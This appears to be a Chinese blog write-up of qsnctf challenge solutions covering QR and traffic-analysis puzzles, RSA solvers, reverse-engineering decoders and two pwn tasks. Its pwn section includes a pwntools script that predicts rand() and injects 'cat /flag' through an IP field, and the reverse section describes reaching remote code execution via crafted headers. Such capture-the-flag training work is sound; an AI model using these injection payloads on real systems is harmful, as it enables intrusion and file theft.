+<h3 id="ScanQR"><a href="#ScanQR" class="headerlink" title="ScanQR"></a>ScanQR</h3><p>下载附件得到QR码<br><img src="http://cdn.anyiblog.top/common/1668766369818-ab37c499-d322-4010-a8bf-baaa08404657.jpg"><br>很是熟悉，这个是汉信码</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766370608-e19a78cb-b41f-45f2-96d8-dc49fa7f7c7e.jpg"><br>在线网站识别下，得到百度盘链接</p>
+<p>访问能看到又是base</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766370960-d8fe2405-3ef7-4b90-a431-5f56fdaa1c5b.jpg"><br>复制到basecrack解密下，又是hex值。。无语了这么喜欢hex</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766371423-a0135d8e-4d34-4dfb-92b8-01fb3c60b31c.jpg"><br>8950是png文件头，winhex同样处理下。</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766371798-860825a7-0f72-40c3-91dd-530f9a8e81e3.jpg"><br>一张二维码，PS处理下 补全码头再扫描</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766372183-77e1ee7a-189a-41b7-b8fc-5ed7779df30a.jpg">  </p>
+<p><img src="http://cdn.anyiblog.top/common/1668766372641-71bbd10e-eeb2-4976-a181-7ba375e70f1b.jpg"><br>qsnctf{29a1ea12-8dd3-4eb3-9a9f-c31e8755c565}</p>
+<h3 id="Cookie怎么分"><a href="#Cookie怎么分" class="headerlink" title="Cookie怎么分"></a>Cookie怎么分</h3><p>流量分析题，但不完全需要看流量 把文件导出即可</p>
+<p>下载附件得到pca流量包，wireshark分析<br><img src="http://cdn.anyiblog.top/common/1668766373369-65e261a9-7287-49da-ada6-502fcedee18f.jpg"><br>这边http导出全部，然后分析里面的文件</p>
+<p>发现有带base64数据，解密看下</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766373807-ae825c07-5c6b-4983-a2ed-a48d391642f9.jpg"><br>发现得到一半的flag</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766374148-2582bf44-136f-4582-9c50-34cb7b9e355c.jpg"><br><img src="http://cdn.anyiblog.top/common/1668766374582-ed7fffee-0642-4479-add2-8572bbc07b21.jpg"><br>主要分析cookie.jpg这几张图片，能发现存在隐写</p>
+<p>本来我认为这几张图片是一样的，所以前面就搞出来一个base11.txt，但后面用binwalk尝试分离的时候又搞出了另一个文本，发现图片是不一样的。</p>
+<p>cookie1：</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766375010-a497bb9f-c1d5-42ba-a112-6240d0e98bdd.jpg"><br>cookie2:</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766375503-2fbd41fe-3ea5-4e56-8e41-c9e5e29f3426.jpg"><br>分别分离处理。</p>
+<p>base11.txt:<br><img src="http://cdn.anyiblog.top/common/1668766375921-c6e73b0c-2440-481a-aa11-ed623e9224ea.jpg">又是这个hex值，同样处理下，因为这里数据有点多 所以用python处理下。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">with open(&#x27;content.txt&#x27;,&#x27;r&#x27;) as f:</span><br><span class="line">    content = &#x27;&#x27;</span><br><span class="line">    for i in f.read().split(&#x27;\n&#x27;):</span><br><span class="line">        content += i.replace(&#x27; &#x27;,&#x27;&#x27;)</span><br><span class="line">    open(&#x27;result.zip&#x27;,&#x27;wb&#x27;).write(binascii.unhexlify(content))</span><br></pre></td></tr></table></figure>
+
+<p>得到result.zip 发现有密码<br><img src="http://cdn.anyiblog.top/common/1668766376350-4cba82d9-a8c9-4b2a-82ea-102607223088.jpg"><br>尝试爆破压缩包密码</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766376881-c06d8fa7-0429-4926-a6c2-8bb613c424f0.jpg"><br>成功恢复 得到密码20221108</p>
+<p>得到图片<br><img src="http://cdn.anyiblog.top/common/1668766378463-ff69e7e1-70ea-499f-a215-bb9a1370c171.jpg"><br>再看另一个文件</p>
+<p>base00.txt:</p>
+<p>同样分离，得到文本</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766378971-a8a2d322-3436-418b-b482-3e087e7dafff.jpg"><br>再用脚本处理下，得到第二个压缩包，里面同样是一张图片</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766379429-f056dcf4-f23e-428f-a7b3-2a12f68779c2.jpg"><br><img src="http://cdn.anyiblog.top/common/1668766380935-76056fc2-3d95-43ef-bd50-96cf3a1aab7f.jpg"><br>仔细看能发现另一张图片是多一行的，所以这里图片存在高度隐写，爆破下crc得到原图片</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766382663-d1633f01-a45c-428b-81d8-3b0f461aad77.jpg"><br>现在思路就很明显了，将两张图片的内容合并在一起，通过ocr和手动修改得到这串base64 再解密写到文件里。</p>
+<p>ps处理合并下。</p>
+<p><img src="http://cdn.anyiblog.top/common/1668824425315-9caf8673-3854-4f57-8467-91c7a77c47c6.jpg">  </p>
+<p>剩下就手动搞，不得不说这题是真套。把我恶心到了，出OCR还非得这么多数据 我起码对了三四个小时才搞好，因为这个base有一个错误图片就显示不完全，总之这种出法我觉得没什么实质意义。</p>
+<p>注意事项就是OCR最好半行半行截取，准确率高一点，然后搞出来的数据像1和l 0和O 还有5和S之类的就需要自己手动去一个个对，可以把你写的数据截个图和原图放到ps，然后把原图透明度搞低，然后两张图对比下 这样比较快。</p>
+<p>最后贴下脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import base64</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">content3 = &quot;&quot;&quot;</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAMEAAAAcCAYAAADY4tttAAANH0lEQVR4nO1aDUhb1x7/7bVEVsijYOmDjD6ax6hSqCskIupaNJPZdqgtU7entlTrWHVvMY6q5dU6Fisz9q1+8KrCagptLPOD1QibymzcipHZCKspryRja8pGAkpCxbwJCZXzzr35vPfGJHbljc384</span><br><span class="line">BK995z/+Z//+X/8zrn3BUKBBBLYwvjTb61AAgn81kgEQQJbHokgSGDLIxEECWx5JIIggS2PRBAksOXxhwwC70Md6o5lQS6XI7dhEo6IrVzQK+WoG3f9n7WLgXUHDO1VyKW6yw+XoPe+97mJNvdQmT3m5ybvj4LtGz5ZM6Hr7Rro8rRYUKYFb7vG65CvNgqaV1xbgO</span><br><span class="line">pgnKO6TNC2d+DmjA3uHclIO1aLi8oiSHdsVv0I8FK9zw5D2j6F7owkuD0iiDfR3bWghab9JgyP3RDtzkbp+SaoDkt+tVrux0botQO4+bUZrjVQ2WlQVKnQdCIN4m2hdo7bzWh0HMHInBbSp254k0TAsgm6f/f5+4qQfFCBM3VNKD0QNrN1F0zXNej4zADbik/+8bN</span><br><span class="line">NqHkjhSP/eWHzfuCF6Uoxam4poF1QgfWo+12QV+s2HGNTPhWHvgX9bmqTi1AVSiEKf0giwkNmP84hlafLiKx7kfPEqVcSWccsWX2yyrk8TyNLEuDJHXLhUCZRaheJne1rJ7OflJGc+jFij1dGNHzXSWSHrpLFmA2dZOx9GVHqnaFb1gFSLCsmmm/s7Jyc/xkiSqqr</span><br><span class="line">xuj5dTp5FsnV02dJpz4wZ0b2GFG/KSPFWotQpy/CdFqdJerXyoh6JNTX/o2G1XPAGhyALHYXkMz6IWJx+nT1/DRLNFR+5Yg9KGqxWyZYz2fFZv3AY9SQnNOVpEzWGVqbpx5Bf/ayUbvLKsnQT89FVb8C1G7fDfjW81vuekYMAkbhzPfHyL3PlQKjLfZlkgLOwm0Or</span><br><span class="line">PGaJsgq9y5dfKFyzwQmCKjuzpgN+UHABL6MFHzKndvqZAORnR4idqGAXw3752d5uvp06vyO11DgWD5dM/sCa7NIOmW0nym6/OcZBJvyg19oQB5SkjHTGHXuzpgJ6tFnlRF85Png3ifhdvNBuCdYMUB93o6m80X4W6Qy6vVCmrwrZvlxf69HR3U+shhuK89FyXvDsN</span><br><span class="line">H7dkoLIJHwKEoy0nNfwfC8JbrQFTN0LTUoyZOzfD/rWBU6pgOMn+HSjSg5R8vrXCvy2XG7EGDADM0J7hOKG2lJtvOEW7D4pQhHMlI4d8VyBbIfGGGOunXwwjbdhcaysPk26GBdiz4dj3eVEtIk9m/3fR2aq8ugmQN01b75BfcrgnWgFG8HuxR+7ILkALWAy81p5Xb</span><br><span class="line">ZIXpZSq3LuQvbeAeqArao7ID+R96+I6qdA1OOzw+Y8QxtDbDXN6Hor3E0p3R25KoFpScUXB9xW6Gne6X8w8xeKR9V7XrYwu3rtcHQ04hy/7zkeSVovGEFf0eVtD3cbn5w42SV3PknpSqf+/Iem7U5mYN5zqMQEeAxX2XLtVpvIU4/5Vk0PSJMnrdoC4js41nCz/mW</span><br><span class="line">TwtiZ/Ani2SMoRSrHraU+mgBr2xGqAQeUycp8NMcplx7lixkqD6HZB4Km8sSk6VotlriD+rPsvzszMOjr4bIrM3powNPGPmZJLPjnmCeLBjdv71KKinNGTCHt9igEghHI0MnZeTCV6Fc6aHzLj5Uxtp8lZZ+y0gDyXmTZt1fwmbCVIJDOeRs3z1iZ+57VkM2tIWJj</span><br><span class="line">2nn+PyAbfnVBZZVsFR3KXYliFh5n1rIAEMdKf1i9f7lEZn4qJjSv4nQOj99RO6MzJJHSz57rgaoLI9dRKqGnCBwfqHkcHNhEPgWKefo6ySTOoaMXjlvNpDOSWr4YMn2GYhPK4II492sw3icxKJXkzKqcHw0Jhx2MvYuj0MLgsCns0CfJxOkQfb8gkAAk3BvwtrTb7</span><br><span class="line">fXz3SSCRs/ROILAmadMguoM/G6+5KPT77s71c5AcDOhHGAggFi4dArP7WKSpP4do7HDyiWJojyNWrTgEfHDAI7GTotIw2TXCLEBJJAb3b9CsL2RUJEoj6RgiBEh5Ynob4CqM4VQbLhaUIyiv41g/Fbo5iaW8DczAwGm9PguFyOKlp6fLDBPAUo5CmRReyrgvZ6EZw</span><br><span class="line">95cjKoKX2eAP0KEWL8pUgNYgfSWC3+U+jtbHDNhdBn50pkO/f5HCbAXPutsatu8lHLmFmeoa9rv9DAtO5HJRfMwtKdjR4fxyGut2BUnUt0sKOOLz3e1FZb0R22wimbvdBJTXibGEjJvnnwzkHkMJZXxFS92fD+4MNGzM+vp3j8QMXJts1gJLSoDgP17zzOnT9WIqS</span><br><span class="line">XC5Ztj2cFOq9U4pUiQOLP0TROgL1Sc0ohWh6GPqHLnjXffe2M7xZO18KG6vwYGyFRWKIRaG/JQcrcEntQNb5OzBXpiDN5WC5vzSKCPGBCnSMVnDuma6YINpXw/JX/vFb8Khs2Qz9ZzoMf7sI2/euoPNk50UZbNm2gT5/RtLOsH+3xRGAvCO97JYpdBdSjdcpzzbqM</span><br><span class="line">TA0AavVyh5R+jXn9g+znfhgKS5qvCh/awCGE904wiXukeHQo6FyBLtauqk9wiPAhC7lJNKvjEIlF7GzrWgbhGK0DoVKHVKorYPz3yjRUKdgdkmsGvHYOYYf7BpXQwMVBt+I93iZ7h1uD2PXqUGkc84vXXA8pj93ayC/JeyVHQhMtw3G2wPQTVtheWhDcHd0ittelN</span><br><span class="line">GI0fpWNJzKh8G/fttnpmshdk1g4K4bxruFkKv5wxghvxH9zFa0NwXpayY4mZGTJVEDICLWrXjwNXD8fCr7L5sxD4ceJzGJgVaquuJeiOsvo+dsCpJZQzEvvOhkosneLd1AHw84KZjqnbLDBPsS0yfsPhvU6VAw9/5SS7P4mdCzHYxiXpg/rULVfDb61NeRvse/gmz</span><br><span class="line">AxJi3WAxma+lZj9GOgWMSjae6kHR+EBfzeI710IjhNQW0co73QHKYburbDTAv0yAIzGnNzU6b25JifzJeYn6f1c4I9wMXbNNGuOeMKMxoFbQzymkiOcV9/4SfJzA8nYaK9/gMIhmSvfRnL699OLxm9FZWYeFwHy71p0Pif9/EvBys4jV1z7SiuNODphtTOJriyzzb</span><br><span class="line">xTvpLNeP4tK0QiDbMUV32z9VYOadNJ8jbgD3AyNMklSo2Da0TNGM0btgpUGzASXij/NFL67RrNkfWMTwLOOHa2ECRmahT6SETjvWnXA9jiX9JUizgGGaHXAwLBxWzDAu0N9jgRupSC8AWuetqD0Q0tu9YIBRko5a1u9EYO3FgQWzt2zIPtcfCgCm3xLDQ2JkQSd1F</span><br><span class="line">tC5vhhjCg4DWpW0Un8wiI5jEWRuE1HN/gs337vXPHDy5c/RSrWeHUYtvLDcN0L08hlfFX5mO4f7QTKkbTNQ8IN7eQKNZY9RMV1DqVy4Q9FEclsHS3ET+vcI5Ur3HwEGLVTvNEgjUXXrLHSPs9HUGwoAprI4IiyB7YEe3jwtivaHSq9vT7CNWVyx4Nr1oohNw8zfIm</span><br><span class="line">ZwlxHaG5Ow/uyGe4W56CLe7UVdmwlF9SXwuY4YivIqJPU3o3XcChfbzgHrlDn4+YLX7Wb5mNftgHm0FXVqIcflI/nlV+h8jDDM+7icd9kKfZsa11Y27uPviaNvU7rX34reeQfclKe7mb49NzHLeUMtQnp5E6RU7467DnZ+rofDaG6bxRFlYG6RQIP+EKVzX8/6juy</span><br><span class="line">81Pjz1CaXZ0P+SA3fMRpuN9rm/jBaW3qRVF2KV6O90l4zU6rTCFthN5qyxMH+gYvltftfQ/XeYXR1T8Lm8pU3788m9F7qgvcUV75o7Sbd+xnhWPHCu+aCdVyDrmnqQMVp8ds5Dj8QiYX+JN6ZBBH8vhZu+xUDdJRtVBdmCysUhTj3JGrdHWhsG4Y5MCaluabxSZgZ</span><br><span class="line">9rE3FQqYYDDagn5l6q+DZi6KQ4Vh488mIkEswd6VPqjfVcO6zBhbDGnGUUqVxlG0L2Rp0YFauvndBU23EgVqhlPSdrkqdOczhnbB8GE+mu/SP5lPJnJOovHLi0jfvdGgfuyrQHeLE60X8pFFF0S8V4GT53twfU8lemN0FWVRHkgdQvNRMXKp3kzfMx/2o3tnLjgv7</span><br><span class="line">SVFuDwEdF0qR+4Dt+/Tg3ODUOVF81Ia9B/0obqtGeWHW+ENfAZy4xIGCv1vKfZIIRmhdtMG7CZC8r5XcfSdEQzmSyMufBDfUwd5TH97qpDfw3+YjYtfdqNodwqqrg8i+WoXGt9qDn42oXi7G/3laRz5x9WjKHEOoLmsgdIkaosDpVBdvxzaC8Zj5zj9IF446EbVQP</span><br><span class="line">eJqo0OKrbR+d0YgeRaH1orO3x7LroxTs8qgYoWCYgUqO+vhrqlHFltXv8nIxcx2DKAwoexx3+BOSLatNYJJPA7hemKHDXbufuLP+RXpAkkIABDU+9roRsToTQjlfNoc3QogQR+p3BNNqOY+YqUobcZXAKaoEMJbHkk6FACWx6JIEhgyyMRBAlseSSCIIEtj/8BZTX</span><br><span class="line">+Vp/p01UAAAAASUVORK5CYII=</span><br><span class="line">&quot;&quot;&quot;.split(&#x27;\n&#x27;)</span><br><span class="line">  </span><br><span class="line">content = &quot;&quot;</span><br><span class="line">line = []</span><br><span class="line">for i in content3:</span><br><span class="line">    content += i</span><br><span class="line">content+=&quot;&quot;</span><br><span class="line">print(content)</span><br><span class="line">open(&#x27;flag.png&#x27;,&#x27;wb&#x27;).write(base64.b64decode(content))</span><br></pre></td></tr></table></figure>
+
+<p>运行得到flag的另一半，最后拼接得到最终flag</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766383425-6a01adf8-f8f6-4805-93ee-4774e9b556a9.jpg"><br>qsnctf{b5512946-d7ac-45c9-afd0-a3f28ba547ea}</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="82-83-65"><a href="#82-83-65" class="headerlink" title="82.83.65"></a>82.83.65</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from binascii import a2b_hex,b2a_hex</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">flag = b&quot;*********************&quot;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">p = 262248800182277040650192055439906580479</span><br><span class="line">q = 262854994239322828547925595487519915551</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">e = 65533</span><br><span class="line">n = p*q</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">d = gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line"># print(d)</span><br><span class="line">c = pow(int(b2a_hex(flag),16),e,n)</span><br><span class="line">print(c)</span><br><span class="line"># C = 31021919570683223794356421266753186826747161146739784961769368259629146487802</span><br></pre></td></tr></table></figure>
+
+<p>c,e,n,p,q都知道 带入工具先搞出d 然后再搞明文得到flag</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766383872-83316fbc-571a-480e-918e-115e46c28c9e.jpg"><br>qsnctf{RSA_SO_EASY_!}</p>
+<h3 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h3><p>下载附件得到xlxs<br><img src="http://cdn.anyiblog.top/common/1668766384311-59de3ba8-9d93-4c9c-8048-8d1e48115ddc.jpg"><br>根据提示就”s”型看数据，然后把数据16进制转换下得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">71736E6374667B33393962313063642D633366392D343931622D6466623564303365346364307D</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.anyiblog.top/common/1668766384704-43ae8ad2-c6d8-4e2a-89cb-41cefe0e98ec.jpg"><br>qsnctf{399b10cd-c3f9-491b-dfb5d03e4cd0}</p>
+<h3 id="babyrsa-RSbaby"><a href="#babyrsa-RSbaby" class="headerlink" title="babyrsa RSbaby"></a>babyrsa RSbaby</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from base64 import b64encode as b32encode</span><br><span class="line">from gmpy2 import invert,gcd,iroot</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from binascii import a2b_hex,b2a_hex</span><br><span class="line">import random</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">flag = &quot;*************&quot;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">nbit = 128</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">p = getPrime(nbit)</span><br><span class="line">q = getPrime(nbit)</span><br><span class="line">n = p*q</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print p</span><br><span class="line">print n</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">e = random.randint(20000,50000)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">while True:</span><br><span class="line">    if gcd(e,phi) == 1:</span><br><span class="line">        break;</span><br><span class="line">    else:</span><br><span class="line">        e -= 1;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">c = pow(int(b2a_hex(flag),16),e,n)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print b32encode(str(c))[::-1]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print str(c)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"># 20392798836838831460465406987101354448592610558736461081264936079945558905138</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 185392927331398754034773152474166007097</span><br><span class="line">n = 33047182186833739970146873552408478599841138065558351794468963853252513446871</span><br><span class="line">c = =gzMxUDM5gTN1UDN5kzNwYzM5QjNyEDOwEjN0YzM3gTN1ATM2ITO1gDN0QTNzEDMxcDO5YDM0UjN0AjN0EzM4gzM4YzM4gTO3ITOzAjM</span><br></pre></td></tr></table></figure>
+
+<p>n,p,c已知 e范围20000-50000 爆破下即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from gmpy2 import invert,gcd</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">n = 33047182186833739970146873552408478599841138065558351794468963853252513446871</span><br><span class="line">p = 185392927331398754034773152474166007097</span><br><span class="line">q = n//p</span><br><span class="line">c = &#x27;=gzMxUDM5gTN1UDN5kzNwYzM5QjNyEDOwEjN0YzM3gTN1ATM2ITO1gDN0QTNzEDMxcDO5YDM0UjN0AjN0EzM4gzM4YzM4gTO3ITOzAjM&#x27;</span><br><span class="line">c = int(base64.b64decode(c[::-1]).decode())</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">for e in range(20000,50000):</span><br><span class="line">    if gcd(e,phi) == 1:</span><br><span class="line">        d = invert(e,phi)</span><br><span class="line">        m = pow(c,d,n)</span><br><span class="line">        if b&#x27;qsnctf&#x27; in (long_to_bytes(m)):</span><br><span class="line">            print(long_to_bytes(m))</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+<p>运行得到flag<br><img src="http://cdn.anyiblog.top/common/1668766385039-c8a2d9e6-07f4-426e-820e-616791cb5dd6.jpg"><br>qsnctf{!RSA_SO_EASY$$}</p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h3><p>64位程序，主要程序：</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766385462-86c4b4a1-98b8-4dd7-8466-92e0c9c92c62.jpg"><br>异或解密下就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls = [&#x27;q&#x27;,&#x27;r&#x27;,&#x27;l&#x27;,&#x27;`&#x27;,&#x27;p&#x27;,&#x27;c&#x27;,&#x27;&#125;&#x27;,&#x27;J&#x27;,&#x27;8&#x27;,&#x27;q&#x27;,&#x27;;&#x27;,&#x27;e&#x27;,&#x27;S&#x27;,&#x27;A&#x27;,&#x27;a&#x27;,&#x27;y&#x27;,&#x27;u&#x27;,&#x27;N&#x27;,&#x27;k&#x27;,&#x27;|&#x27;,&#x27;a&#x27;,&#x27;4&#x27;,&#x27;k&#x27;] + [&quot;&quot;]*100</span><br><span class="line">for i in range(23):</span><br><span class="line">    ls[i+24] = chr(i ^ ord(ls[i]))</span><br><span class="line">print(&#x27;&#x27;.join(ls[23:]))</span><br></pre></td></tr></table></figure>
+<p>qsnctf{M0x1n_Love_you!}</p>
+<h3 id="EasyBase"><a href="#EasyBase" class="headerlink" title="EasyBase"></a>EasyBase</h3><p>64位程序，windows程序代码是真的难看懂。。IDA分析</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766385995-7faa7f02-ad1e-4a8c-b37a-7dab62e901da.jpg"><br>前面是接收数据，然后分别加密后与最终结果比对<br><img src="http://cdn.anyiblog.top/common/1668766386396-e5b186ef-f71f-4ddd-9fa5-9993b55cb35f.jpg"><br>中间的加密分别是rot13 -&gt; base64 -&gt; rot13</p>
+<p>rot13函数：</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766386761-fd399841-f18d-4619-ae6e-3092d8af192e.jpg"><br><img src="http://cdn.anyiblog.top/common/1668766387253-69be6a2f-d817-48be-8569-7c23f3b39856.jpg"><br>base64函数：</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766387661-a7282a5c-1fd8-4b85-85a5-fcbe0caa73bf.jpg"><br>需要注意的是这里如果直接在线网站解解出来是错的，因为这边rot13多了一个操作，就是对数字也进行偏移计算，偏移量为5：</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766388007-8864d4ed-4d56-4771-9aad-a71a5cc2645a.jpg"><br>写下脚本解密下，还需要注意下就是比对的字符串要reverse反转一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def rot13(n):</span><br><span class="line">    digit = string.digits</span><br><span class="line">    lower = string.ascii_lowercase</span><br><span class="line">    upper = string.ascii_uppercase</span><br><span class="line">    res = &quot;&quot;</span><br><span class="line">    for i in n:</span><br><span class="line">        if i in digit:</span><br><span class="line">            res += chr((digit.index(i) +5)%10 + 48)</span><br><span class="line">        elif i in lower:</span><br><span class="line">            res += chr((lower.index(i) + 13)%26 +97)</span><br><span class="line">        elif i in upper:</span><br><span class="line">            res += chr((upper.index(i) + 13)%26 +65)</span><br><span class="line">        else:</span><br><span class="line">            res += i</span><br><span class="line">    return res</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">cipher = &quot;=DzMuO8MmgaomuGA9Rmpj5lAkAwZgxQplNGYhOwAi6lAmywZlqGZ7LQB7pGs&quot;[::-1]</span><br><span class="line">print(cipher,rot13(cipher))</span><br><span class="line">print(rot13(base64.b64decode(rot13(cipher)).decode())[::-1])</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.anyiblog.top/common/1668766388385-4a7be585-1996-48c2-93c0-20c754f1a285.jpg"><br>qsnctf{af3036f5-2d87-4c75-a51b-2f47e2611312}</p>
+<h3 id="This-is"><a href="#This-is" class="headerlink" title="This..is?"></a>This..is?</h3><p><img src="http://cdn.anyiblog.top/common/1668766388816-db7430ad-ef24-4992-8421-2422559af972.jpg"><br>这题是一个程序通过构造参数 向web容器发送数据，所以也可以看懂了re直接在web里做</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766389187-e7955e23-991d-4aae-90f7-de80a86b04cc.jpg"><br>32位程序，大部分没看懂 都是根据关键词尝试最后试出来的。</p>
+<p>程序有未定义代码需要修复一下，按p</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766389619-ed07e2e6-a38d-4330-a66c-3289511e2053.jpg"><br><img src="http://cdn.anyiblog.top/common/1668766390097-9acd8f03-4029-48d4-8d6f-26e38162fe0e.jpg"><br>程序就是根据用户输入的数据进行构造url数据包发送，再把请求截取回来。同时程序还有许多过滤，其实只要在web上发送就不会被过滤</p>
+<p>已有信息账号admin 密码qsnctf2022_reverse</p>
+<p>查看程序发现传参是?username&#x3D;xxx&amp;password&#x3D;xxxx</p>
+<p>web传一下</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766390490-60b1c9f3-23c2-44f1-a316-151746d88ed4.jpg"><br>发现还需要传一个”shell”</p>
+<p>尝试post不是，仔细看代码发现是headers的数据发送shell</p>
+<p>那么hackbar构造一下再发送</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766390879-a54aefb7-4bbc-4597-a130-af2e609c213c.jpg"><br>提示Authorization有问题，Authorization即认证令牌 也是一个密码，再看程序。</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766391223-88e33080-350f-4e28-ac98-308251da878f.jpg">  </p>
+<p>程序里有一段base64 猜测是auth令牌的密码，解密得到：</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766391628-411799dd-ebf4-4919-841e-89d3697eed4e.jpg"><br>带入Authorization再次传参成功RCE</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766392046-41187319-796c-4119-acaa-92240648c097.jpg"><br>qsnctf{72d3bae2-7985-4e7d-bce8-8d5a743b9564}</p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p><img src="http://cdn.anyiblog.top/common/1668766392414-71f7b25c-c509-407f-be97-e175233ef81c.jpg"><br>猜测一个数如果对了就执行back函数</p>
+<p>back：</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766392770-fb61c819-601a-4d1b-8146-d1257c291661.jpg"><br>用通配符绕过一下就能rce了</p>
+<p>这边随机数绕过，因为题目给了libc 可以利用libc来构造随机数是一定正确的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">p = remote(&#x27;recruit.qsnctf.com&#x27;,10080)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">libc = cdll.LoadLibrary(&#x27;libc.so.6&#x27;)</span><br><span class="line">libc.srand(0x37)</span><br><span class="line">  </span><br><span class="line">p.sendlineafter(&#x27;guess num:\n&#x27;,str(libc.rand()))</span><br><span class="line">p.sendline(&#x27;1.1.1.1|cat /flag&#x27;)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.anyiblog.top/common/1668766393221-b6bb3f37-068f-4c17-bb26-a0dce1363f05.jpg"><br>qsnctf{0301aa1c-9511-4a4d-9d32-a4811ba72b6f}</p>
+<h3 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h3><p><img src="http://cdn.anyiblog.top/common/1668766393625-abbae773-dadb-45aa-ab56-bce36d9775c2.jpg">  </p>
+<p>int整型溢出，要求v4大于5，v4-1小于等于5。</p>
+<p>取int最大值+1即可 2147483647+1 &#x3D; 2147483648</p>
+<p><img src="http://cdn.anyiblog.top/common/1668766394009-060f2d3e-a10e-4aaf-bb12-cd65d503dec5.jpg"><br>qsnctf{39ee7f29-9bb2-42f5-950e-d6b21fcc563f}</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Anyyy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.anyiblog.top/2022/11/19/20221119/">http://www.anyiblog.top/2022/11/19/20221119/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.anyiblog.top" target="_blank">Anyyy安全小站</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" 